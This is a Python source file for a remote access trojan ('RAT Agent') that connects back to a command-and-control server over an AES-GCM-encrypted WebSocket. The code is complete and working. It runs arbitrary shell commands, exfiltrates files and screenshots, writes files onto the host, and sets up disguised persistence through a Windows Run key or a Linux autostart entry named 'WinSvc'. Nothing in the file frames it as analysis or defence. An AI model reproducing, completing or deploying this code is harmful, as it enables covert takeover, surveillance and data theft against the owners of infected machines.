#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAT Agent :: cross-platform, AES-GCM, WebSocket reverse C2
"""

import os, sys, json, time, socket, platform, getpass, hashlib, base64
import subprocess, tempfile
from datetime import datetime

try:
    import websocket
except Exception:
    print("pip install websocket-client"); sys.exit(1)

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except Exception:
    print("pip install pycryptodome"); sys.exit(1)

C2_URL = "ws://127.0.0.1:8080/socket.io/?EIO=4&transport=websocket"
KEY    = hashlib.sha256(b"CHANGE_THIS_MASTER_KEY_32BYTES!!").digest()

def enc(plain: bytes) -> str:
    iv = get_random_bytes(12)
    c = AES.new(KEY, AES.MODE_GCM, nonce=iv)
    ct, tag = c.encrypt_and_digest(plain)
    return base64.b64encode(iv + tag + ct).decode()

def dec(b64: str) -> bytes:
    raw = base64.b64decode(b64)
    iv, tag, ct = raw[:12], raw[12:28], raw[28:]
    c = AES.new(KEY, AES.MODE_GCM, nonce=iv)
    return c.decrypt_and_verify(ct, tag)

def agent_id():
    seed = f"{platform.node()}|{getpass.getuser()}|{platform.system()}"
    return hashlib.sha256(seed.encode()).hexdigest()[:16]

def sysinfo():
    return {
        "id": agent_id(),
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()} ({platform.machine()})",
        "user": getpass.getuser(),
        "python": sys.version.split()[0],
        "ip": socket.gethostbyname(socket.gethostname()) if hasattr(socket, "gethostbyname") else "?",
    }

def do_exec(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        out = r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
        return out or f"[exit {r.returncode}]"
    except Exception as e:
        return f"[err] {e}"

def do_list(path):
    try:
        out = []
        for e in os.scandir(path or "."):
            try:
                st = e.stat()
                out.append(f"{e.name}\t{'d' if e.is_dir() else 'f'}\t{st.st_size}\t{datetime.fromtimestamp(st.st_mtime).isoformat()}")
            except Exception:
                out.append(e.name)
        return "\n".join(out) or "[empty]"
    except Exception as e:
        return f"[err] {e}"

def do_get(path):
    try:
        with open(path, "rb") as f:
            return "B64:" + base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"[err] {e}"

def do_put(path, b64):
    try:
        data = base64.b64decode(b64)
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return f"[ok] wrote {len(data)} bytes -> {path}"
    except Exception as e:
        return f"[err] {e}"

def do_screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        p = os.path.join(tempfile.gettempdir(), "shot.png")
        img.save(p)
        return do_get(p)
    except Exception as e:
        return f"[err] screenshot: {e}"

def do_persist():
    try:
        if platform.system() == "Windows":
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "WinSvc", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(k)
            return "[ok] windows Run key set"
        elif platform.system() == "Linux":
            p = os.path.expanduser("~/.config/autostart/win.desktop")
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "w") as f:
                f.write(f"[Desktop Entry]\nType=Application\nName=WinSvc\nExec={sys.executable}\n")
            return f"[ok] {p}"
        else:
            return "[!] persistence not implemented for this OS"
    except Exception as e:
        return f"[err] persist: {e}"

def dispatch(cmd):
    c = cmd.strip()
    if c.startswith("exec "):
        return do_exec(c[5:])
    if c.startswith("cd "):
        try:
            os.chdir(c[3:].strip()); return f"[ok] cwd={os.getcwd()}"
        except Exception as e:
            return f"[err] {e}"
    if c.startswith("ls"):
        return do_list(c[2:].strip() or ".")
    if c.startswith("get "):
        return do_get(c[4:].strip())
    if c.startswith("put "):
        parts = c.split(" ", 2)
        if len(parts) < 3: return "[err] put <path> <b64>"
        return do_put(parts[1], parts[2])
    if c == "sysinfo":
        return json.dumps(sysinfo(), indent=2)
    if c == "screenshot":
        return do_screenshot()
    if c == "persist":
        return do_persist()
    if c == "pwd":
        return os.getcwd()
    if c == "whoami":
        return getpass.getuser()
    if c == "exit":
        os._exit(0)
    return do_exec(c)

class Agent:
    def __init__(self, url, key):
        self.url = url
        self.key = key
        self.ws = None
        self.alive = True

    def send(self, event, payload):
        blob = enc(json.dumps(payload).encode())
        pkt = json.dumps({"event": event, "blob": blob})
        self.ws.send("42" + json.dumps(["msg", pkt]))

    def on_message(self, raw):
        if not raw: return
        if raw.startswith("0"):
            self.ws.send("40"); return
        if raw == "2":
            self.ws.send("3"); return
        if raw.startswith("42"):
            try:
                arr = json.loads(raw[2:])
                data = arr[1]
                if data.get("event") == "exec":
                    cid = data["cid"]; cmd = data["cmd"]
                    out = dispatch(cmd)
                    self.send("result", {"cid": cid, "out": out})
            except Exception:
                pass

    def run(self):
        import threading
        while self.alive:
            try:
                self.ws = websocket.create_connection(self.url, timeout=30)
                self.send("register", sysinfo())
                threading.Thread(target=self._hb, daemon=True).start()
                while self.alive:
                    raw = self.ws.recv()
                    if raw: self.on_message(raw)
            except Exception:
                time.sleep(5)

    def _hb(self):
        while self.alive:
            try:
                self.send("heartbeat", {"id": agent_id()})
            except Exception:
                pass
            time.sleep(20)

if __name__ == "__main__":
    a = Agent(C2_URL, KEY)
    try:
        a.run()
    except KeyboardInterrupt:
        a.alive = False